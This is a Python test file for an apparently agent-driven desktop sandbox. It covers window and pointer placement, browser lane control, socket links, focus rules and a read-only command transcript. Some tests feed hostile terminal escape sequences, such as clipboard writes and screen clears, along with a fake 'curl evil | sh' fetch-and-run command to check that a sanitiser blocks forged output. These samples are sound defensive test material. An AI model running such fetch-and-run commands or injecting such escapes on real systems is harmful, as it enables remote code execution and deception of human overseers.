def test_the_browser_windows_numbers_are_checked_and_place_the_agents_pointer(tmp_path):
    area = desklink.window_area
    assert area({"t": "win", "x": 72, "y": 95, "w": 1776, "h": 890, "shown": True}) == (72, 95, 1776, 890)
    for bad in ({"x": 72, "y": 95, "w": 1776, "h": 890, "shown": False}, {"x": 1.5, "y": 0, "w": 9, "h": 9, "shown": True},
                {"x": 0, "y": 0, "w": 0, "h": 9, "shown": True}, {"x": "0", "y": 0, "w": 9, "h": 9, "shown": True},
                {"x": 0, "y": 0, "w": 10 ** 9, "h": 9, "shown": True}, {"x": True, "y": 0, "w": 9, "h": 9, "shown": True}):
        assert area(bad) is None, bad
    place = desklink.placer((72, 95, 1776, 890), (1920, 1080), {})
    # the page fills the window's width and its bottom: 890 - 800 = 90 px of the browser's bars above it
    assert place(0, 0, 1776, 800) == (72, 185, 1920, 1080)
    assert place(100, 50, 1776, 800) == (172, 235, 1920, 1080)
    assert place(10 ** 6, -50, 1776, 800) == (72 + 1775, 185, 1920, 1080)  # kept inside the window
    assert place(100, 50, 888, 400) == (272, 285, 1920, 1080)  # a page zoomed to 200 %
    assert place(1, 1, 0, 800) is None


def test_the_agents_pointer_follows_the_window_and_hides_for_the_terminal(tmp_path):
    from openajar.node.agent_pointer import POINTERS

    links, _link = _links(tmp_path)
    links.vm.screen_size = lambda env_id: (1920, 1080)
    seen: list[dict] = []
    unwatch = POINTERS.watch("env/e1234567890-browser", seen.append)
    try:
        env = links.svc.by_id["e1234567890"]
        links.window(env, (72, 95, 1776, 890))
        POINTERS.moved("env/e1234567890-browser", 100, 50, 1776, 800, "press")
        assert seen[-1] == {"x": 172, "y": 235, "w": 1920, "h": 1080, "kind": "press"}
        links.window(env, (0, 54, 1920, 936))  # maximized: the pointer goes with the page
        assert seen[-1] == {"x": 100, "y": 54 + 90 + 50, "w": 1920, "h": 1080, "kind": "move"}
        links.mirror("env/e1234567890", "ls", None)
        assert seen[-1] == {"hide": "terminal"}
        links.window(env, None)  # minimized
        assert seen[-1] == {"hide": "away"} and "env/e1234567890-browser" not in POINTERS.placers
    finally:
        unwatch()
        POINTERS.place_with("env/e1234567890-browser", None)


class DockLanes:
    def __init__(self, control="agent"):
        self.opened: list[tuple[str, str]] = []
        self.state = control

    def control(self, lane_id):
        return SimpleNamespace(state=SimpleNamespace(value=self.state))

    async def open(self, lane_id, *, principal_kind="agent"):
        self.opened.append((lane_id, principal_kind))


async def test_the_docks_browser_opens_the_browser_lane_as_whoever_has_control(tmp_path, monkeypatch):
    for control, kind in (("agent", "agent"), ("human", "human")):
        links, _link = _links(tmp_path, control=control)
        lanes = DockLanes(control)
        get = links.svc._get
        links.svc._get = lambda name, lanes=lanes, get=get: lanes if name == "lanes" else get(name)
        links._agent_has = lambda env, control=control: control == "agent"
        lanes._check_gates = lambda lane, kind: None
        links.want("e1234567890", "browser")
        links.want("e1234567890", "browser")  # a second click within WANT_GAP_S: nothing more
        links.want("e1234567890", "terminal")  # nothing else is acted on
        await asyncio.gather(*links._opening)
        assert lanes.opened == [("env/e1234567890-browser", kind)]


async def test_the_dock_never_opens_the_browser_past_a_stop_or_a_freeze(tmp_path):
    """The dock's ask comes from the machine, which is the agent's: a stopped agent or a frozen lane gets no
    browser from it, also while a person has the screen."""
    from openajar.core.errors import PolicyDenied

    for control, gate_refuses in (("paused", False), ("human", True)):
        links, _link = _links(tmp_path, control=control)
        lanes = DockLanes(control)

        def frozen(lane, kind, refuse=gate_refuses):
            if refuse:
                raise PolicyDenied("frozen")

        lanes._check_gates = frozen
        get = links.svc._get
        links.svc._get = lambda name, lanes=lanes, get=get: lanes if name == "lanes" else get(name)
        links.want("e1234567890", "browser")
        await asyncio.gather(*links._opening)
        assert lanes.opened == [], control


async def test_the_link_reads_only_the_docks_ask_for_the_browser(tmp_path):
    import tempfile

    wants: list[str] = []

    async def serve(reader, writer):
        await reader.readline()
        writer.write(b'{"t": "focus", "what": "browser"}\nnot json\n{"t": "want", "what": "browser"}\n')
        writer.write(b"x" * (desklink.READ_MAX * 2) + b"\n")  # too long: the link ends
        await writer.drain()

    path = tempfile.mkdtemp(prefix="desk-", dir="/tmp") + "/desk"
    server = await asyncio.start_unix_server(serve, path)
    try:
        link = desklink._Link(path, on_want=wants.append)
        link.send({"t": "hello"})
        await until(lambda: wants and link.writer is None)
        assert wants == ["browser"] and link.writer is None
    finally:
        server.close()


async def test_the_link_drops_what_it_cannot_send_and_never_raises(tmp_path):
    import tempfile

    link = desklink._Link(str(tmp_path / "nothing-there"))
    link.send({"t": "focus", "what": "browser"})  # no socket: dropped, tried again later
    assert link.pending == [] and link.writer is None
    server_got: list[bytes] = []

    async def serve(reader, writer):
        server_got.append(await reader.readline())
        writer.close()

    path = tempfile.mkdtemp(prefix="desk-", dir="/tmp") + "/desk"  # a Unix socket's path is short on macOS
    server = await asyncio.start_unix_server(serve, path)
    try:
        live = desklink._Link(path)
        live.send({"t": "focus", "what": "terminal"})
        await until(lambda: server_got)
        assert json.loads(server_got[0]) == {"t": "focus", "what": "terminal"}
        live.close()
    finally:
        server.close()


# ------------------------------------------------------------------ the helper's transcript


@pytest.fixture
def desk(monkeypatch, tmp_path):
    """desktop/desk.py with stand-ins for python-xlib (the machine has it, the node does not)."""
    xlib = types.ModuleType("Xlib")
    for name in ("X", "Xatom", "display", "xauth", "error"):
        sub = types.ModuleType(f"Xlib.{name}")
        setattr(xlib, name, sub)
        monkeypatch.setitem(sys.modules, f"Xlib.{name}", sub)
    xlib.xauth.Xauthority = type("Xauthority", (), {})
    xlib.X.AnyPropertyType = 0
    xlib.error.XError = type("XError", (Exception,), {})
    proto = types.ModuleType("Xlib.protocol")
    proto.event = types.ModuleType("Xlib.protocol.event")
    proto.request = types.ModuleType("Xlib.protocol.request")  # KillClient: an older desk's wallpaper goes
    proto.request.KillClient = lambda **kw: None
    monkeypatch.setitem(sys.modules, "Xlib", xlib)
    monkeypatch.setitem(sys.modules, "Xlib.protocol", proto)
    monkeypatch.setitem(sys.modules, "Xlib.protocol.event", proto.event)
    monkeypatch.setitem(sys.modules, "Xlib.protocol.request", proto.request)
    monkeypatch.setenv("AGENTOS_DESK_DIR", str(tmp_path))
    ns: dict = {"__name__": "desk-under-test", "__file__": str(DESK / "desk.py")}
    exec(compile((DESK / "desk.py").read_text(), "desk.py", "exec"), ns)  # noqa: S102 - our own file
    return SimpleNamespace(ns=ns, log=tmp_path / "commands.log")


def _deskterm():
    ns: dict = {"__name__": "deskterm-under-test"}
    exec(compile((DESK / "deskterm.py").read_text(), "deskterm.py", "exec"), ns)  # noqa: S102 - our own file
    return SimpleNamespace(**ns, ns=ns)


SGR = re.compile(r"\x1b\[[0-9;]*m")


def test_a_commands_output_cannot_drive_the_terminal_that_shows_it():
    clean = _deskterm().clean
    assert clean("ok\x1b[32m green\x1b[0m") == "ok\x1b[32m green\x1b[0m"  # colours stay
    assert clean("a\x1b]0;evil title\x07b") == "ab"  # no window title
    assert clean("a\x1b]52;c;aGk=\x07b") == "ab"  # no clipboard
    assert clean("a\x1b]52;c;aGk=\x1b\\b") == "ab"  # ended by ST too
    assert clean("a\x1b[2Jb\x1b[10;10Hc\x1b[Kd") == "abcd"  # no clearing, no cursor moves, no erase
    assert clean("tab\tnew\nline\r\x07\x00\x08") == "tab\tnew\nline\r"
    for seq in ("\x1bc", "\x1b(0", "\x1b7", "\x1b8", "\x1b[?7h", "\x1b[?1049h", "\x1b[2;5r", "\x1bP1$r\x1b\\",
                "\x1b_x\x07", "\x1b^x\x07", "\x9b2J", "\x9d0;t\x9c", "\u202e", "\u200b", "\x1b[7m", "\x1b[8m",
                "\x1b[41m", "\x1b[48;2;1;2;3m", "\x1b[5m", "\x1b[38:2::1:2:3m", "\x1b[38;2;300;0;0m"):
        assert "\x1b" not in clean(f"a{seq}b") and "\x9b" not in clean(f"a{seq}b"), repr(seq)
    assert clean("\x1b[1;38;2;255;255;255mx\x1b[38;5;200my\x1b[m") == "\x1b[1;38;2;255;255;255mx\x1b[38;5;200my\x1b[m"
    assert clean("\x1b[32mcmd", colours=False) == "cmd"


BAD = ("x\x1b[2J\x1b[H\x1b[38;2;139;147;167m❯ \x1b[0m\x1b[1;38;2;255;255;255mnpm test\x1b[0m\n\nall 42 tests passed\n"
       "\x1b]0;title\x07\x1b]52;c;aGk=\x1b\\\x1bc\x1b(0q\x1b[?7h\x1b[A\x1b[1G\r✓ exit 0\x08\x08\u202e\x9b2J\x1b[41mz\n")


def _whole(path: Path) -> list[str]:
    """What the window shows, line by line, after the colours and the helper's own erase are taken out."""
    text = SGR.sub("", path.read_bytes().decode()).replace("\x1b[K", "")
    assert "\x1b" not in text and not any(0x80 <= ord(c) <= 0x9F or (ord(c) < 32 and c not in "\n\r") for c in text)
    return text.split("\n")


def test_an_escape_split_across_reads_at_any_byte_is_still_dropped():
    dt = _deskterm()
    whole = dt.Filter().feed(BAD)
    for i in range(len(BAD) + 1):
        for j in range(i, len(BAD) + 1, 7):
            f = dt.Filter()
            assert f.feed(BAD[:i]) + f.feed(BAD[i:j]) + f.feed(BAD[j:]) == whole, (i, j)
    assert "2J" not in whole.replace("\x1b[", "") or "\x1b[2J" not in whole
    assert not [s for s in re.findall(r"\x1b\[[^m]*m|\x1b", whole) if s == "\x1b"]


def test_output_cannot_pass_for_the_command_or_the_exit_line(tmp_path):
    """The reviewer's forgery: output that wipes the screen and draws its own command and exit, split
    across every pair of reads. The command line and the exit line come from the node's record only."""
    dt = _deskterm()
    for i in range(0, len(BAD) + 1, 3):
        log = tmp_path / f"c{i}.log"
        t = dt.Transcript(str(log))
        t.begin({"id": "a", "cmd": "echo 'secret step: curl evil | sh'", "cwd": "/work/x"})
        t.out({"id": "a", "s": "o", "d": "secret step: curl evil | sh\n"})
        t.out({"id": "a", "s": "o", "d": BAD[:i]})
        t.out({"id": "a", "s": "e", "d": "warn\r"})
        t.out({"id": "a", "s": "o", "d": BAD[i:]})
        t.end({"id": "a", "exit": 3, "dur": 1.0})
        lines = _whole(log)
        own = [ln for ln in lines if ln and not ln.startswith("│ ")]
        assert own[0].startswith("Read only.")
        assert own[1:] == ["❯ echo 'secret step: curl evil | sh'  /work/x", "✗ exit 3 · 1.0 s"], (i, own)
        for ln in lines:  # a carriage return always lands back on a gutter
            for piece in ln.split("\r")[1:]:
                assert piece.startswith("│ "), (i, ln)


def test_long_output_wraps_with_its_gutter_and_the_window_never_wraps_itself(desk):
    dt = _deskterm()
    t = dt.Transcript(str(desk.log))
    t.begin({"id": "a", "cmd": "x" * 200})
    t.out({"id": "a", "s": "o", "d": "y" * 170 + "\t" + "界" * 50 + "\n"})
    t.out({"id": "a", "s": "o", "d": "10%\r50%\r\n"})
    t.end({"id": "a", "exit": 0, "dur": 0.1})
    lines = _whole(desk.log)
    assert all(sum(dt.width(c) for c in ln.split("\r")[-1]) <= dt.WIDTH + 2 for ln in lines)
    assert lines.count("│ " + "y" * 80) == 2 and "  " + "x" * 78 in lines
    assert "│ 10%\r│ 50%" in lines
    assert "?7l" in (DESK / "desk.py").read_text()  # the window starts with its own wrapping off


def test_the_transcript_reads_as_a_terminal_session(desk):
    t = desk.ns["Transcript"](str(desk.log))
    t.begin({"id": "a", "cmd": "npm test", "cwd": "/work/shop"})
    t.out({"id": "a", "s": "o", "d": "41 passed\n"})
    t.out({"id": "a", "s": "e", "d": "warn: old\n"})
    t.end({"id": "a", "exit": 0, "dur": 1.62})
    t.begin({"id": "b", "cmd": "make", "cwd": ""})
    t.end({"id": "b", "exit": 2, "dur": 0.2, "dropped": 4096})
    t.begin({"id": "c", "cmd": "sleep 9", "cwd": ""})
    t.end({"id": "c", "timeout": True, "exit": None, "dur": 60})
    t.begin({"id": "d", "cmd": "npm run dev", "cwd": ""})
    t.end({"id": "d", "job": "j-1"})
    plain = re.sub(r"\x1b\[[0-9;]*m", "", desk.log.read_text())
    assert "❯ npm test  /work/shop\n│ 41 passed\n│ warn: old\n" in plain
    assert "✓ exit 0 · 1.6 s" in plain and "✗ exit 2 · 200 ms" in plain
    assert "4 KB more output, not shown here (the agent got all of it)" in plain
    assert "⏱ timed out after 1 min 0 s" in plain and "runs in the background as job j-1" in plain
    assert EM_DASH not in plain


def test_the_transcript_starts_a_new_file_when_it_grows(desk):
    dt = _deskterm()
    dt.ns["LOG_MAX"] = 200
    t = dt.Transcript(str(desk.log))
    for i in range(10):
        t.out({"id": "a", "s": "o", "d": f"line {i} " + "x" * 40 + "\n"})
    assert Path(str(desk.log) + ".1").exists() and desk.log.stat().st_size < 400


def test_the_desk_socket_is_the_one_the_tunnel_forwards():
    assert tunnels.VM_DESK_SOCKET == _ctl_namespace()["DESK_SOCK"]
    desk = (DESK / "desk.py").read_text()
    assert 'os.path.join(os.path.dirname(STATE), "desk.sock")' in desk  # beside the session's folder


def test_the_top_bar_says_who_has_control_and_what_the_agent_does(desk, monkeypatch):
    status = desk.ns["Status"]()
    assert status.words() == ("", "The agent has control", False)
    status.update({"agent": "Claude Code\x07", "control": "agent", "doing": "browser", "tz": 60})
    assert status.words() == ("Claude Code", " is using the browser", False) and status.tz == 60
    assert 0 < status.wake_in() <= desk.ns["DOING_S"]
    status.running.add("a")
    assert status.words()[1] == " is running a command" and status.wake_in() is None
    status.running.clear()
    status.update({"control": "human", "tz": 10 ** 6})  # an offset no place has: kept as it was
    assert status.words() == ("", "You have control", True) and status.tz == 60
    status.update({"control": "paused"})
    assert status.words()[1] == " is stopped"
    status.update({"control": "agent"})
    monkeypatch.setattr(desk.ns["time"], "monotonic", lambda: 10 ** 9)  # long after the last browser call
    assert status.words() == ("Claude Code", " has control", False)


def test_long_titles_and_statuses_end_with_an_ellipsis():
    sys.path.insert(0, str(DESK))
    try:
        import deskart
    finally:
        sys.path.remove(str(DESK))
    f = deskart.font(17)
    assert deskart.fit("short", f, 500) == "short"
    cut = deskart.fit("A very long environment title that keeps going and going", f, 200)
    assert cut.endswith("…") and f.getlength(cut) <= 200 and EM_DASH not in cut
    assert deskart.fit("anything", f, 1) == ""
    assert deskart.clock(0, 120) == ("Thu 1 Jan", "02:00")
    left, width, xs, sep = deskart.layout(1920, 3, 1)
    assert left + width // 2 in range(959, 962) and sep is not None and xs[3] - xs[2] == deskart.ICON + deskart.GAP + deskart.SEP


def test_a_browser_that_comes_up_late_takes_no_focus_by_itself():
    """openbox gives the agent's browser no focus when its window maps (the rule), so desk.py decides."""
    rc = (DESK / "openbox" / "rc.xml").read_text()
    rule = rc[rc.index('<application class="*amoufox*"'):]
    assert "<focus>no</focus>" in rule[:rule.index("</application>")]
    assert "<focusNew>yes</focusNew>" in rc  # any other new window still gets it


def test_an_app_keeps_the_keyboard_when_the_browser_comes_up_after_it(desk):
    """Eval t11: LXTerminal opened (screen_open), then the browser that started with the environment mapped its
    first window and took the keyboard, so the agent typed into Camoufox. The app the agent opened stays in
    front; once the browser's start is over, a person's choice of the browser stands."""
    g = desk.ns["FocusGuard"]()
    born = g.BORN_S
    assert g.saw(7, {7: "terminal"}, 0.0) is None and g.last_app == 7
    assert g.saw(9, {7: "terminal", 9: "browser"}, 1.0) == 7  # the new browser took focus: the terminal goes back
    assert g.saw(7, {7: "terminal", 9: "browser"}, 1.1) is None
    assert g.saw(9, {7: "terminal", 9: "browser"}, 2.0) == 7  # the browser raises itself again during its start
    assert g.saw(9, {7: "terminal", 9: "browser"}, 1.0 + born + 1) is None  # later: a person clicked it
    assert g.last_app is None
    assert g.saw(9, {7: "terminal", 9: "browser", 11: "browser"}, 20.0) is None  # nothing to give back to


def test_the_browser_comes_forward_when_it_is_asked_for_or_nothing_else_has_focus(desk):
    g = desk.ns["FocusGuard"]()
    assert g.saw(7, {7: "app:Galculator"}, 0.0) is None
    g.asked(0.5)  # the agent drives the browser (the node's focus), or the dock's Browser
    assert g.saw(9, {7: "app:Galculator", 9: "browser"}, 1.0) is None and g.last_app is None
    fresh = desk.ns["FocusGuard"]()
    assert fresh.saw(None, {9: "browser"}, 0.0) == 9  # an empty desktop: the browser gets the focus
    term = desk.ns["FocusGuard"]()
    assert term.saw(3, {3: "agent"}, 0.0) is None and term.last_app is None  # the agent's read-only transcript
    assert term.saw(3, {3: "agent", 9: "browser"}, 1.0) == 9
    gone = desk.ns["FocusGuard"]()
    gone.saw(7, {7: "terminal"}, 0.0)
    assert gone.saw(None, {9: "browser"}, 1.0) == 9  # the app closed meanwhile: the browser gets it


def test_the_commands_window_starts_with_its_read_only_line(desk):
    t = desk.ns["Transcript"](str(desk.log))
    t.agent = "Claude Code"
    t.note({"text": "hello"})
    plain = re.sub(r"\x1b\[[0-9;]*m", "", desk.log.read_text())
    assert plain.startswith("Read only. The commands Claude Code runs show here.\n")


async def test_after_a_node_restart_the_running_desktop_gets_its_link_back(tmp_path, monkeypatch):
    """The node restarts under a running screen: the display answers kept, and the node greets the helper
    (the dock's Browser and the top bar know it is there) before the agent's next call."""
    machine = DesktopMachine(display={"ok": True, "desktop": True, "server": "xvnc", "kept": True, "mended": []})
    svc, vm = _vm(tmp_path, machine)
    env = svc.by_id["e1234567890"]
    greeted: list[str] = []
    monkeypatch.setattr(desklink.DeskLinks, "hello", lambda self, e: greeted.append(e.id))
    vm.screen_soon(env)
    await asyncio.gather(*vm._screen_tasks.values())
    assert greeted == ["e1234567890"]


async def test_closing_an_environment_whose_machine_does_not_answer_waits_for_it_once(tmp_path):
    machine = DesktopMachine()
    svc, vm = _vm(tmp_path, machine)
    env, lane = svc.by_id["e1234567890"], "env/e1234567890-browser"
    await vm.acquire(lane)
    stops: list[dict] = []

    async def silent(env, action, **kw):
        stops.append({"action": action, **kw})
        raise EngineError("the machine did not answer within 30 s")

    vm.ctl = silent
    await vm.release(lane)  # the browser's stop: the machine does not answer
    await vm.drop_screen(env)  # the close: not asked a second time
    assert [s["what"] for s in stops] == [["browser"]]


def test_stopping_never_signals_process_1_or_its_own_group(ctl, monkeypatch):
    """os.killpg(1, sig) on Linux signals every process of this user: a pid file or a fake that says 1 (or 0)
    must stop nothing. (A test once faked the browser's pid as 1, and on a CI runner it killed the runner.)"""
    ns = ctl.ns
    sent: list[tuple[int, int]] = []
    real_os = ns["os"]
    ns["os"] = SimpleNamespace(**{k: getattr(real_os, k) for k in dir(real_os) if not k.startswith("__")})
    ns["os"].killpg = lambda pid, sig: sent.append((pid, sig))
    ns["RECORDER_PID"] = str(ctl.run / "ffmpeg.pid")
    for pid in (0, 1):
        ns["_running"] = lambda name, pid=pid: pid
        ns["_stop"]("browser")
        Path(ns["RECORDER_PID"]).write_text(f"{pid}\n")
        ns["_stop_recorder"]()
    assert sent == []

